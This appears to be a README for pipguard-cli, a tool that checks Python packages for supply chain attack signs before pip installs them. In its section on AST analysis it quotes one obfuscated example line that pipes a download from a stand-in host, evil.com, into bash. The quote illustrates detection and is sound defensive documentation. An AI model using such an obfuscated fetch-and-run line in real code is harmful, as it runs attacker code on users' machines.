# pipguard-cli

Supply chain attack prevention for pip installs. Analyzes Python packages for security risks **before** they touch your system.

```bash
pip install pipguard-cli
pipguard configure
```

From that point on, every `pip install` automatically runs through pipguard.

---

## The Problem

Supply chain attacks on Python packages are increasing — fake packages stealing API keys, compromised maintainer accounts pushing backdoors, typosquatted names targeting developers who mistype. The data to detect these threats exists across PyPI, OSV.dev, and GitHub. The problem is nobody checks before installing.

pipguard makes checking automatic.

---

## How It Works

Every `pip install` triggers a two-layer analysis before anything downloads:

**Layer 1 — Trust signals** (no download required)
- Package age and version history
- Maintainer account signals
- Download spike detection
- Known CVEs via OSV.dev
- GitHub repo presence

**Layer 2 — Static code analysis** (AST-based)
- Downloads the source tarball
- Analyzes `setup.py`, `pyproject.toml`, `__init__.py` without executing anything
- Detects network calls, env variable access, shell execution, base64 obfuscation, home directory access

Results are combined into a risk score:

```
0–30   → LOW RISK     — installs automatically
31–60  → MEDIUM RISK  — asks for confirmation
61+    → HIGH RISK    — blocked, requires explicit override
```

---

## Example Output

```
$ pip install some-package

Analyzing some-package...

──────────────────── TRUST SCORE ────────────────────
  Package age:       12d   🔴
  GitHub repo:       🔴 none
  Download spike:    normal  ✅
  Known vulns:       ✅ none

──────────────────── CODE ANALYSIS ──────────────────
  Network requests:  🔴 FOUND
  Env var access:    🔴 FOUND
  Shell execution:   ✅ NOT FOUND
  Base64 obfuscation:✅ NOT FOUND
  Home dir access:   ✅ NOT FOUND

──────────────────────────────────────────────────────
  VERDICT:  🔴 HIGH RISK  (Score: 75)
──────────────────────────────────────────────────────

Proceed anyway? [y/N]
```

---

## Installation

```bash
pip install pipguard-cli
pipguard configure
```

`configure` writes a shell function to your profile that intercepts `pip install`. Works on bash, zsh, fish, and PowerShell. Close and reopen your terminal after running it.

To update pipguard itself, bypass the shell function:

```bash
python -m pip install pipguard-cli --upgrade
```

---

## Commands

```bash
pipguard install <package>             # analyze then install
pipguard info <package>                # report only, no install
pipguard scan                          # scan requirements.txt
pipguard scan --ci --fail-on medium    # CI mode, exits 1 on threshold
pipguard history                       # recent scan results
pipguard update --force                # clear CVE cache immediately
pipguard configure                     # set up shell interception
```

---

## CI/CD

```yaml
# GitHub Actions example
- name: Scan dependencies
  run: pipguard scan --ci --fail-on high
```

Exits with code `1` if any package meets the fail threshold, blocking the pipeline.

---

## Why AST over grep

pipguard uses Python's AST parser instead of string matching. This catches obfuscated patterns that grep misses:

```python
# grep misses this, AST catches it
getattr(os, 'sys'+'tem')('curl evil.com | bash')
```

---

## Caching

Results are cached locally at `~/.pipguard/cache.db` — trust scores for 24 hours, CVE data for 6 hours. Repeat installs of the same package are instant. Use `--no-cache` to force a fresh check, or `pipguard update --force` to immediately refresh vulnerability data after a major security event.

---

## vs. Existing Tools

| Tool | Gap |
|------|-----|
| `pip audit` | Only known CVEs — misses new malicious packages |
| socket.dev | Not a CLI intercept, requires separate workflow |
| OSV.dev | Database only, no workflow integration |
| Dependabot | Reacts after install, not before |
| **pipguard** | Intercepts at install, combines trust signals + AST analysis |
